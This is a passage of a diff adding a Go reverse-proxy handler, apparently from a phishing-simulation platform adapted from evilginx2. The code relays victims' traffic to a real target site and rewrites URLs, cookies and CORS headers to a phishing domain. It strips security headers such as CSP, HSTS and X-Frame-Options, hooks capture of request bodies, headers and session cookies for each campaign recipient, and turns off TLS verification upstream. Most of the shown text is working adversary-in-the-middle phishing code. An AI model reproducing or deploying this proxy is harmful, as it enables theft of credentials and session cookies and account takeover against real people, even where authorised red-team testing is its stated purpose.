@@ -1,0 +1,2091 @@
+package proxy
+
+import (
+	"bytes"
+	"compress/flate"
+	"compress/gzip"
+	"context"
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"net/http/cookiejar"
+	"net/url"
+	"regexp"
+	"sort"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/go-errors/errors"
+	"github.com/google/uuid"
+	"github.com/phishingclub/phishingclub/cache"
+	"github.com/phishingclub/phishingclub/data"
+	"github.com/phishingclub/phishingclub/database"
+	"github.com/phishingclub/phishingclub/model"
+	"github.com/phishingclub/phishingclub/repository"
+	"github.com/phishingclub/phishingclub/server"
+	"github.com/phishingclub/phishingclub/service"
+	"github.com/phishingclub/phishingclub/utils"
+	"github.com/phishingclub/phishingclub/vo"
+	"go.uber.org/zap"
+	"gopkg.in/yaml.v3"
+)
+
+/*
+This source file is a modified / highly inspired by evilginx2 (https://github.com/kgretzky/evilginx2/)
+Which was inspired by the bettercap (https://github.com/bettercap/bettercap) project.
+Evilginx is a fantastic MITM phishing project - so check it out!
+
+Thank you!
+*/
+
+/*
+Portions of this code are derived from EvilGinx2 (https://github.com/kgretzky/evilginx2)
+Copyright (c) 2017-2023 Kuba Gretzky (@kgretzky)
+Licensed under BSD-3-Clause License
+
+EvilGinx2 itself incorporates code from the Bettercap project:
+https://github.com/bettercap/bettercap
+Copyright (c) 2016-2023 Simone Margaritelli (@evilsocket)
+
+This derivative work is licensed under AGPL-3.0.
+See THIRD_PARTY_LICENSES.md for complete license texts.
+*/
+
+const (
+	PROXY_COOKIE_MAX_AGE     = 3600
+	CONVERT_TO_ORIGINAL_URLS = 0
+	CONVERT_TO_PHISHING_URLS = 1
+)
+
+var (
+	MATCH_URL_REGEXP                = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+	MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
+)
+
+type ProxySession struct {
+	ID                    string
+	CampaignRecipientID   *uuid.UUID
+	CampaignID            *uuid.UUID
+	RecipientID           *uuid.UUID
+	Campaign              *model.Campaign
+	Domain                *database.Domain
+	TargetDomain          string
+	Config                sync.Map // map[string]service.ProxyServiceDomainConfig
+	CreatedAt             time.Time
+	RequiredCaptures      sync.Map     // map[string]bool
+	CapturedData          sync.Map     // map[string]map[string]string
+	NextPageType          atomic.Value // string
+	IsComplete            atomic.Bool
+	CookieBundleSubmitted atomic.Bool
+}
+
+// RequestContext holds all the context data for a proxy request
+type RequestContext struct {
+	SessionID           string
+	SessionCreated      bool
+	PhishDomain         string
+	TargetDomain        string
+	Domain              *database.Domain
+	ProxyConfig         *service.ProxyServiceConfigYAML
+	Session             *ProxySession
+	ConfigMap           map[string]service.ProxyServiceDomainConfig
+	CampaignRecipientID *uuid.UUID
+	ParamName           string
+}
+
+type ProxyHandler struct {
+	logger                      *zap.SugaredLogger
+	sessions                    sync.Map // map[string]*ProxySession
+	campaignRecipientSessions   sync.Map // map[string]string (campaignRecipientID -> sessionID)
+	PageRepository              *repository.Page
+	CampaignRecipientRepository *repository.CampaignRecipient
+	CampaignRepository          *repository.Campaign
+	CampaignTemplateRepository  *repository.CampaignTemplate
+	DomainRepository            *repository.Domain
+	ProxyRepository             *repository.Proxy
+	IdentifierRepository        *repository.Identifier
+	CampaignService             *service.Campaign
+	cookieName                  string
+}
+
+func NewProxyHandler(
+	logger *zap.SugaredLogger,
+	pageRepository *repository.Page,
+	campaignRecipientRepository *repository.CampaignRecipient,
+	campaignRepository *repository.Campaign,
+	campaignTemplateRepository *repository.CampaignTemplate,
+	domainRepository *repository.Domain,
+	proxyRepository *repository.Proxy,
+	identifierRepository *repository.Identifier,
+	campaignService *service.Campaign,
+	cookieName string,
+) *ProxyHandler {
+	return &ProxyHandler{
+		logger:                      logger,
+		sessions:                    sync.Map{},
+		PageRepository:              pageRepository,
+		CampaignRecipientRepository: campaignRecipientRepository,
+		CampaignRepository:          campaignRepository,
+		CampaignTemplateRepository:  campaignTemplateRepository,
+		DomainRepository:            domainRepository,
+		ProxyRepository:             proxyRepository,
+		IdentifierRepository:        identifierRepository,
+		CampaignService:             campaignService,
+		cookieName:                  cookieName,
+	}
+}
+
+// HandleHTTPRequest processes incoming http requests through the proxy
+func (m *ProxyHandler) HandleHTTPRequest(w http.ResponseWriter, req *http.Request, domain *database.Domain) error {
+	ctx := req.Context()
+
+	// initialize request context
+	reqCtx, err := m.initializeRequestContext(ctx, req, domain)
+	if err != nil {
+		return err
+	}
+
+	// create http client
+	client, err := m.createHTTPClient(req, reqCtx.ProxyConfig)
+	if err != nil {
+		return errors.Errorf("failed to create proxy HTTP client: %w", err)
+	}
+
+	// process request
+	modifiedReq, resp := m.processRequestWithContext(req, reqCtx)
+	if resp != nil {
+		return m.writeResponse(w, resp)
+	}
+
+	// prepare request for target server
+	m.prepareRequestForTarget(modifiedReq, client)
+
+	// execute request
+	targetResp, err := client.Do(modifiedReq)
+	if err != nil {
+		m.logger.Errorw("failed to execute proxied request", "error", err)
+		return fmt.Errorf("failed to execute request: %w", err)
+	}
+	defer targetResp.Body.Close()
+
+	// process response
+	finalResp := m.processResponseWithContext(targetResp, reqCtx)
+
+	// write final response
+	return m.writeResponse(w, finalResp)
+}
+
+func (m *ProxyHandler) extractTargetDomain(domain *database.Domain) string {
+	targetDomain := domain.ProxyTargetDomain
+	if targetDomain == "" {
+		return ""
+	}
+	if strings.Contains(targetDomain, "://") {
+		if parsedURL, err := url.Parse(targetDomain); err == nil {
+			targetDomain = parsedURL.Host
+		}
+	}
+	return targetDomain
+}
+
+func (m *ProxyHandler) createHTTPClient(req *http.Request, proxyConfig *service.ProxyServiceConfigYAML) (*http.Client, error) {
+	client := &http.Client{
+		Timeout:   30 * time.Second,
+		Transport: &http.Transport{},
+	}
+
+	if proxyConfig.Proxy != "" {
+		proxyURL, err := url.Parse("http://" + proxyConfig.Proxy)
+		if err != nil {
+			return nil, err
+		}
+		client.Transport = &http.Transport{
+			Proxy: http.ProxyURL(proxyURL),
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true,
+			},
+		}
+	}
+	return client, nil
+}
+
+// initializeRequestContext creates and populates the request context with all necessary data
+func (m *ProxyHandler) initializeRequestContext(ctx context.Context, req *http.Request, domain *database.Domain) (*RequestContext, error) {
+	// setup proxy config
+	proxyEntry, err := m.ProxyRepository.GetByID(ctx, domain.ProxyID, &repository.ProxyOption{})
+	if err != nil {
+		return nil, errors.Errorf("failed to fetch Proxy config: %w", err)
+	}
+	proxyConfig, err := m.parseProxyConfig(proxyEntry.ProxyConfig.MustGet().String())
+	if err != nil {
+		return nil, errors.Errorf("failed to parse Proxy config for domain %s: %w", domain.Name, err)
+	}
+
+	// extract target domain
+	targetDomain := m.extractTargetDomain(domain)
+	if targetDomain == "" {
+		return nil, errors.Errorf("domain has empty Proxy target domain")
+	}
+
+	// check for campaign recipient id
+	campaignRecipientID, paramName := m.getCampaignRecipientIDFromURLParams(req)
+
+	reqCtx := &RequestContext{
+		PhishDomain:         req.Host,
+		TargetDomain:        targetDomain,
+		Domain:              domain,
+		ProxyConfig:         proxyConfig,
+		CampaignRecipientID: campaignRecipientID,
+		ParamName:           paramName,
+	}
+
+	return reqCtx, nil
+}
+
+func (m *ProxyHandler) processRequestWithContext(req *http.Request, reqCtx *RequestContext) (*http.Request, *http.Response) {
+	// ensure scheme is set
+	if req.URL.Scheme == "" {
+		req.URL.Scheme = "https"
+	}
+
+	reqURL := req.URL.String()
+	createSession := reqCtx.CampaignRecipientID != nil
+
+	// handle existing session cleanup if this is an initial request
+	if createSession {
+		m.cleanupExistingSession(reqCtx.CampaignRecipientID, reqURL)
+	} else {
+		// check for existing session
+		sessionCookie, err := req.Cookie(m.cookieName)
+		if err == nil && m.isValidSessionCookie(sessionCookie.Value) {
+			reqCtx.SessionID = sessionCookie.Value
+		}
+	}
+
+	// handle requests without session
+	if reqCtx.SessionID == "" && !createSession {
+		return m.prepareRequestWithoutSession(req, reqCtx.TargetDomain), nil
+	}
+
+	// get or create session and populate context
+	err := m.resolveSessionContext(req, reqCtx, createSession)
+	if err != nil {
+		m.logger.Errorw("failed to resolve session context", "error", err)
+		return req, m.createServiceUnavailableResponse("Service temporarily unavailable")
+	}
+
+	// apply session-based request processing
+	return m.applySessionToRequestWithContext(req, reqCtx), nil
+}
+
+func (m *ProxyHandler) cleanupExistingSession(campaignRecipientID *uuid.UUID, reqURL string) {
+	if existingSessionID := m.findSessionByCampaignRecipient(campaignRecipientID); existingSessionID != "" {
+		m.sessions.Delete(existingSessionID)
+		m.campaignRecipientSessions.Delete(campaignRecipientID.String())
+
+	}
+}
+
+func (m *ProxyHandler) prepareRequestWithoutSession(req *http.Request, targetDomain string) *http.Request {
+	req.Host = targetDomain
+	req.URL.Host = targetDomain
+	req.URL.Scheme = "https"
+
+	return req
+}
+
+// resolveSessionContext gets or creates a session and populates the request context
+func (m *ProxyHandler) resolveSessionContext(req *http.Request, reqCtx *RequestContext, createSession bool) error {
+	if createSession {
+		newSession, err := m.createNewSession(req, reqCtx.CampaignRecipientID, reqCtx.ProxyConfig, reqCtx.Domain, reqCtx.TargetDomain)
+		if err != nil {
+			return err
+		}
+		reqCtx.SessionID = newSession.ID
+		reqCtx.SessionCreated = true
+		reqCtx.Session = newSession
+	} else {
+		// load existing session
+		sessionVal, exists := m.sessions.Load(reqCtx.SessionID)
+		if !exists {
+			return fmt.Errorf("session not found")
+		}
+		session, ok := sessionVal.(*ProxySession)
+		if !ok {
+			return fmt.Errorf("invalid session type")
+		}
+		reqCtx.Session = session
+	}
+
+	// populate config map once
+	reqCtx.ConfigMap = m.configToMap(&reqCtx.Session.Config)
+	return nil
+}
+
+func (m *ProxyHandler) applySessionToRequestWithContext(req *http.Request, reqCtx *RequestContext) *http.Request {
+	// handle initial request with campaign recipient id
+	if reqCtx.CampaignRecipientID != nil {
+		req.Host = reqCtx.Session.TargetDomain
+		req.URL.Scheme = "https"
+		req.URL.Host = reqCtx.Session.TargetDomain
+		// remove campaign recipient id from query params
+		q := req.URL.Query()
+		q.Del(reqCtx.ParamName)
+		req.URL.RawQuery = q.Encode()
+	} else {
+		// for subsequent requests, map to original host
+		originalHost := m.replaceHostWithOriginal(req.Host, reqCtx.ConfigMap)
+		req.Host = originalHost
+		req.URL.Host = originalHost
+	}
+
+	// apply request processing
+	m.processRequestWithSessionContext(req, reqCtx)
+	return req
+}
+
+func (m *ProxyHandler) processRequestWithSessionContext(req *http.Request, reqCtx *RequestContext) {
+	// normalize headers
+	m.normalizeRequestHeaders(req, reqCtx.Session)
+
+	// apply capture rules
+	m.onRequestBody(req, reqCtx.Session)
+	m.onRequestHeader(req, reqCtx.Session)
+
+	// patch query parameters
+	m.patchQueryParametersWithContext(req, reqCtx)
+
+	// patch request body
+	m.patchRequestBodyWithContext(req, reqCtx)
+}
+
+func (m *ProxyHandler) patchQueryParametersWithContext(req *http.Request, reqCtx *RequestContext) {
+	qs := req.URL.Query()
+	if len(qs) == 0 {
+		return
+	}
+
+	for param := range qs {
+		for i, value := range qs[param] {
+			qs[param][i] = string(m.patchUrls(reqCtx.ConfigMap, []byte(value), CONVERT_TO_ORIGINAL_URLS))
+		}
+	}
+	req.URL.RawQuery = qs.Encode()
+}
+
+func (m *ProxyHandler) patchRequestBodyWithContext(req *http.Request, reqCtx *RequestContext) {
+	if req.Body == nil {
+		return
+	}
+
+	body, err := io.ReadAll(req.Body)
+	if err != nil {
+		m.logger.Errorw("failed to read request body for patching", "error", err)
+		return
+	}
+	req.Body.Close()
+
+	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_ORIGINAL_URLS)
+	req.Body = io.NopCloser(bytes.NewBuffer(body))
+	req.ContentLength = int64(len(body))
+}
+
+func (m *ProxyHandler) prepareRequestForTarget(req *http.Request, client *http.Client) {
+	req.RequestURI = ""
+	req.Header.Del("Accept-Encoding")
+
+	// setup cookie jar for redirect handling
+	jar, _ := cookiejar.New(nil)
+	client.Jar = jar
+	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+
+	// remove proxy session cookie
+	m.removeProxyCookie(req)
+}
+
+func (m *ProxyHandler) removeProxyCookie(req *http.Request) {
+	if req.Header.Get("Cookie") == "" {
+		return
+	}
+
+	cookies := req.Cookies()
+	var filteredCookies []*http.Cookie
+	for _, cookie := range cookies {
+		if cookie.Name != m.cookieName {
+			filteredCookies = append(filteredCookies, cookie)
+		}
+	}
+
+	req.Header.Del("Cookie")
+	for _, cookie := range filteredCookies {
+		req.AddCookie(cookie)
+	}
+}
+
+func (m *ProxyHandler) processResponseWithContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
+	if resp == nil {
+		return nil
+	}
+
+	// handle responses with or without session
+	if reqCtx.SessionID != "" && reqCtx.Session != nil {
+		// capture response data before any rewriting
+		m.captureResponseDataWithContext(resp, reqCtx)
+
+		// process cookies for phishing domain responses after capture
+		if reqCtx.PhishDomain != "" {
+			m.processCookiesForPhishingDomainWithContext(resp, reqCtx)
+		}
+
+		return m.processResponseWithSessionContext(resp, reqCtx)
+	}
+
+	// process cookies for phishing domain responses (no session case)
+	if reqCtx.PhishDomain != "" {
+		m.processCookiesForPhishingDomainWithContext(resp, reqCtx)
+	}
+
+	return m.processResponseWithoutSessionContext(resp, reqCtx)
+}
+
+func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCtx *RequestContext) {
+	// capture cookies, headers, and body
+	m.onResponseCookies(resp, reqCtx.Session)
+	m.onResponseHeader(resp, reqCtx.Session)
+
+	contentType := resp.Header.Get("Content-Type")
+	if m.shouldProcessContent(contentType) {
+		body, _, err := m.readAndDecompressBody(resp)
+		if err == nil {
+			m.onResponseBody(resp, body, reqCtx.Session)
+			resp.Body = io.NopCloser(bytes.NewReader(body))
+		}
+	}
+}
+
+func (m *ProxyHandler) processResponseWithSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
+	// set session cookie for new sessions
+	if reqCtx.SessionCreated {
+		m.setSessionCookieWithContext(resp, reqCtx)
+	}
+
+	// check for campaign flow progression
+	if m.shouldRedirectForCampaignFlow(reqCtx.Session, resp.Request) {
+		if redirectResp := m.createCampaignFlowRedirect(reqCtx.Session, resp); redirectResp != nil {
+			if reqCtx.SessionCreated {
+				m.copyCookieToResponse(resp, redirectResp)
+			}
+			return redirectResp
+		}
+	}
+
+	// apply response rewriting
+	m.rewriteResponseHeadersWithContext(resp, reqCtx)
+	m.rewriteResponseBodyWithContext(resp, reqCtx)
+
+	return resp
+}
+
+func (m *ProxyHandler) setSessionCookieWithContext(resp *http.Response, reqCtx *RequestContext) {
+	cookie := &http.Cookie{
+		Name:     m.cookieName,
+		Value:    reqCtx.SessionID,
+		Path:     "/",
+		Domain:   "." + reqCtx.PhishDomain,
+		Expires:  time.Now().Add(time.Duration(PROXY_COOKIE_MAX_AGE) * time.Second),
+		HttpOnly: true,
+		Secure:   true,
+		SameSite: http.SameSiteLaxMode,
+	}
+	resp.Header.Add("Set-Cookie", cookie.String())
+}
+
+func (m *ProxyHandler) copyCookieToResponse(sourceResp, targetResp *http.Response) {
+	if cookieHeader := sourceResp.Header.Get("Set-Cookie"); cookieHeader != "" {
+		targetResp.Header.Set("Set-Cookie", cookieHeader)
+	}
+}
+
+func (m *ProxyHandler) rewriteResponseHeadersWithContext(resp *http.Response, reqCtx *RequestContext) {
+	// remove security headers
+	securityHeaders := []string{
+		"Content-Security-Policy",
+		"Content-Security-Policy-Report-Only",
+		"Strict-Transport-Security",
+		"X-XSS-Protection",
+		"X-Content-Type-Options",
+		"X-Frame-Options",
+	}
+	for _, header := range securityHeaders {
+		resp.Header.Del(header)
+	}
+
+	// fix cors headers
+	if allowOrigin := resp.Header.Get("Access-Control-Allow-Origin"); allowOrigin != "" && allowOrigin != "*" {
+		if oURL, err := url.Parse(allowOrigin); err == nil {
+			if phishHost := m.replaceHostWithPhished(oURL.Host, reqCtx.ConfigMap); phishHost != "" {
+				oURL.Host = phishHost
+				resp.Header.Set("Access-Control-Allow-Origin", oURL.String())
+			}
+		}
+		resp.Header.Set("Access-Control-Allow-Credentials", "true")
+	}
+
+	// fix location header
+	if location := resp.Header.Get("Location"); location != "" {
+		if rURL, err := url.Parse(location); err == nil {
+			if phishHost := m.replaceHostWithPhished(rURL.Host, reqCtx.ConfigMap); phishHost != "" {
+				rURL.Host = phishHost
+				resp.Header.Set("Location", rURL.String())
+			}
+		}
+	}
+}
+
+func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCtx *RequestContext) {
+	contentType := resp.Header.Get("Content-Type")
+	if !m.shouldProcessContent(contentType) {
+		return
+	}
+
+	defer resp.Body.Close()
+	body, wasCompressed, err := m.readAndDecompressBody(resp)
+	if err != nil {
+		m.logger.Errorw("failed to read and decompress response body", "error", err)
+		return
+	}
+
+	body = m.patchUrls(reqCtx.ConfigMap, body, CONVERT_TO_PHISHING_URLS)
+	body = m.applyCustomReplacements(body, reqCtx.Session)
+
+	m.updateResponseBody(resp, body, wasCompressed)
+	resp.Header.Set("Cache-Control", "no-cache, no-store")
+}
+
+func (m *ProxyHandler) processResponseWithoutSessionContext(resp *http.Response, reqCtx *RequestContext) *http.Response {
+	// create minimal config for url rewriting
+	config := m.createMinimalConfig(reqCtx.PhishDomain, reqCtx.TargetDomain)
+
+	// apply basic response processing
+	m.removeSecurityHeaders(resp)
+	m.rewriteLocationHeaderWithoutSession(resp, config)
+	m.rewriteResponseBodyWithoutSessionContext(resp, reqCtx, config)
+
+	return resp
+}
+
+func (m *ProxyHandler) processCookiesForPhishingDomainWithContext(resp *http.Response, reqCtx *RequestContext) {
+	cookies := resp.Cookies()
+	if len(cookies) == 0 {
+		return
+	}
+
+	tempConfig := map[string]service.ProxyServiceDomainConfig{
+		reqCtx.TargetDomain: {To: reqCtx.PhishDomain},
+	}
+
+	resp.Header.Del("Set-Cookie")
+	for _, ck := range cookies {
+		m.adjustCookieSettings(ck, reqCtx.Session, resp)
+		m.rewriteCookieDomain(ck, tempConfig, resp)
+		resp.Header.Add("Set-Cookie", ck.String())
+	}
+}
+
+func (m *ProxyHandler) createMinimalConfig(phishDomain, targetDomain string) map[string]service.ProxyServiceDomainConfig {
+	config := make(map[string]service.ProxyServiceDomainConfig)
+	var fullConfigYAML *service.ProxyServiceConfigYAML
+
+	dbDomain := &database.Domain{}
+	if err := m.DomainRepository.DB.Where("name = ?", phishDomain).First(dbDomain).Error; err == nil {
+		if dbDomain.ProxyID != nil {
+			dbProxy := &database.Proxy{}
+			if err := m.ProxyRepository.DB.Where("id = ?", *dbDomain.ProxyID).First(dbProxy).Error; err == nil {
+				if configYAML, err := m.parseProxyConfig(dbProxy.ProxyConfig); err == nil {
+					fullConfigYAML = configYAML
+					for host, hostConfig := range fullConfigYAML.Hosts {
+						if hostConfig != nil {
+							config[host] = *hostConfig
+						}
+					}
+				}
+			}
+		}
+	}
+
+	// fallback to basic mapping
+	if len(config) == 0 {
+		config[targetDomain] = service.ProxyServiceDomainConfig{To: phishDomain}
+	}
+
+	// add global rules to all host configurations
+	if fullConfigYAML != nil && fullConfigYAML.Global != nil {
+		for originalHost := range config {
+			hostConfig := config[originalHost]
+			// append global capture rules
+			hostConfig.Capture = append(hostConfig.Capture, fullConfigYAML.Global.Capture...)
+			// append global rewrite rules
+			hostConfig.Rewrite = append(hostConfig.Rewrite, fullConfigYAML.Global.Rewrite...)
+			config[originalHost] = hostConfig
+		}
+	}
+
+	return config
+}
+
+func (m *ProxyHandler) removeSecurityHeaders(resp *http.Response) {
+	headers := []string{
+		"Content-Security-Policy",
+		"Content-Security-Policy-Report-Only",
+		"Strict-Transport-Security",
+		"X-XSS-Protection",
+		"X-Content-Type-Options",
+		"X-Frame-Options",
+	}
+	for _, header := range headers {
+		resp.Header.Del(header)
+	}
+}
+
+func (m *ProxyHandler) rewriteLocationHeaderWithoutSession(resp *http.Response, config map[string]service.ProxyServiceDomainConfig) {
+	location := resp.Header.Get("Location")
+	if location == "" {
+		return
+	}
+
+	if rURL, err := url.Parse(location); err == nil {
+		if phishHost := m.replaceHostWithPhished(rURL.Host, config); phishHost != "" {
+			rURL.Host = phishHost
+			resp.Header.Set("Location", rURL.String())
+		}
+	}
+}
+
+func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Response, reqCtx *RequestContext, config map[string]service.ProxyServiceDomainConfig) {
+	contentType := resp.Header.Get("Content-Type")
+	if !m.shouldProcessContent(contentType) {
+		return
+	}
+
+	defer resp.Body.Close()
+	body, wasCompressed, err := m.readAndDecompressBody(resp)
+	if err != nil {
+		m.logger.Errorw("failed to read and decompress response body", "error", err)
+		return
+	}
+
+	body = m.patchUrls(config, body, CONVERT_TO_PHISHING_URLS)
+	body = m.applyCustomReplacementsWithoutSession(body, config, reqCtx.TargetDomain)
+
+	m.updateResponseBody(resp, body, wasCompressed)
+	if m.shouldCacheControlContent(contentType) {
+		resp.Header.Set("Cache-Control", "no-cache, no-store")
+	}
+}
+
+func (m *ProxyHandler) shouldCacheControlContent(contentType string) bool {
+	return strings.Contains(contentType, "text/html") ||
+		strings.Contains(contentType, "javascript") ||
+		strings.Contains(contentType, "application/json")
+}
+
+func (m *ProxyHandler) patchUrls(config map[string]service.ProxyServiceDomainConfig, body []byte, convertType int) []byte {
+	hostMap, hosts := m.buildHostMapping(config, convertType)
+
+	// sort hosts by length (longest first) to avoid partial replacements
+	sort.Slice(hosts, func(i, j int) bool {
+		return len(hosts[i]) > len(hosts[j])
+	})
+
+	// first pass: urls with schemes
+	body = m.replaceURLsWithScheme(body, hosts, hostMap)
+
+	// second pass: urls without schemes
+	body = m.replaceURLsWithoutScheme(body, hosts, hostMap)
+
+	return body
+}
+
+func (m *ProxyHandler) buildHostMapping(config map[string]service.ProxyServiceDomainConfig, convertType int) (map[string]string, []string) {
+	hostMap := make(map[string]string)
+	var hosts []string
+
+	for originalHost, hostConfig := range config {
+		if hostConfig.To == "" {
+			continue
+		}
+
+		var from, to string
+		if convertType == CONVERT_TO_ORIGINAL_URLS {
+			from = hostConfig.To
+			to = originalHost
+		} else {
+			from = originalHost
+			to = hostConfig.To
+		}
+
+		hostMap[strings.ToLower(from)] = to
+		hosts = append(hosts, strings.ToLower(from))
+	}
+
+	return hostMap, hosts
+}
+
+func (m *ProxyHandler) replaceURLsWithScheme(body []byte, hosts []string, hostMap map[string]string) []byte {
+	return []byte(MATCH_URL_REGEXP.ReplaceAllStringFunc(string(body), func(sURL string) string {
+		u, err := url.Parse(sURL)
+		if err != nil {
+			return sURL
+		}
+
+		for _, h := range hosts {
+			if strings.ToLower(u.Host) == h {
+				return strings.Replace(sURL, u.Host, hostMap[h], 1)
+			}
+		}
+		return sURL
+	}))
+}
+
+func (m *ProxyHandler) replaceURLsWithoutScheme(body []byte, hosts []string, hostMap map[string]string) []byte {
+	return []byte(MATCH_URL_REGEXP_WITHOUT_SCHEME.ReplaceAllStringFunc(string(body), func(sURL string) string {
+		for _, h := range hosts {
+			if strings.Contains(sURL, h) && !strings.Contains(sURL, hostMap[h]) {
+				return strings.Replace(sURL, h, hostMap[h], 1)
+			}
+		}
+		return sURL
+	}))
+}
+
+func (m *ProxyHandler) replaceHostWithOriginal(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
+	for originalHost, hostConfig := range config {
+		if strings.EqualFold(hostConfig.To, hostname) {
+			return originalHost
+		}
+	}
+	return ""
+}
+
+func (m *ProxyHandler) replaceHostWithPhished(hostname string, config map[string]service.ProxyServiceDomainConfig) string {
+	for originalHost, hostConfig := range config {
+		if strings.EqualFold(originalHost, hostname) {
+			return hostConfig.To
+		}
+
+		// check for subdomain mapping
+		if strings.HasSuffix(strings.ToLower(hostname), "."+strings.ToLower(originalHost)) {
+			subdomain := strings.TrimSuffix(hostname, "."+originalHost)
+			if subdomain != "" {
+				return subdomain + "." + hostConfig.To
+			}
+			return hostConfig.To
+		}
+	}
+	return ""
+}
+
+func (m *ProxyHandler) createNewSession(
+	req *http.Request,
+	campaignRecipientID *uuid.UUID,
+	proxyConfig *service.ProxyServiceConfigYAML,
+	domain *database.Domain,
+	targetDomain string,
+) (*ProxySession, error) {
+	ctx := req.Context()
+
+	// get campaign information
+	campaign, recipientID, campaignID, err := m.getCampaignInfo(ctx, campaignRecipientID)
+	if err != nil {
+		return nil, err
+	}
+
+	// create session configuration
+	sessionConfig := m.buildSessionConfig(targetDomain, domain.Name, proxyConfig)
+
+	// create session
+	session := &ProxySession{
+		ID:                  uuid.New().String(),
+		CampaignRecipientID: campaignRecipientID,
+		CampaignID:          campaignID,
+		RecipientID:         recipientID,
+		Campaign:            campaign,
+		Domain:              domain,
+		TargetDomain:        targetDomain,
+		CreatedAt:           time.Now(),
+	}
+
+	// initialize session data
+	m.initializeSession(session, sessionConfig)
+
+	// store session
+	m.sessions.Store(session.ID, session)
+	if campaignRecipientID != nil {
+		m.campaignRecipientSessions.Store(campaignRecipientID.String(), session.ID)
+	}
+
+	return session, nil
+}
+
+func (m *ProxyHandler) getCampaignInfo(ctx context.Context, campaignRecipientID *uuid.UUID) (*model.Campaign, *uuid.UUID, *uuid.UUID, error) {
+	cRecipient, err := m.CampaignRecipientRepository.GetByID(ctx, campaignRecipientID, &repository.CampaignRecipientOption{})
+	if err != nil {
+		return nil, nil, nil, fmt.Errorf("invalid campaign recipient ID %s: %w", campaignRecipientID.String(), err)
+	}
+
+	recipientID, err := cRecipient.RecipientID.Get()
+	if err != nil {
+		return nil, nil, nil, fmt.Errorf("campaign recipient %s has no recipient ID: %w", campaignRecipientID.String(), err)
+	}
+
+	campaignID, err := cRecipient.CampaignID.Get()
+	if err != nil {
+		return nil, nil, nil, fmt.Errorf("campaign recipient %s has no campaign ID: %w", campaignRecipientID.String(), err)
+	}
+
+	campaign, err := m.CampaignRepository.GetByID(ctx, &campaignID, &repository.CampaignOption{
+		WithCampaignTemplate: true,
+	})
+	if err != nil {
+		return nil, nil, nil, fmt.Errorf("failed to get campaign %s: %w", campaignID.String(), err)
+	}
+
+	return campaign, &recipientID, &campaignID, nil
+}
+
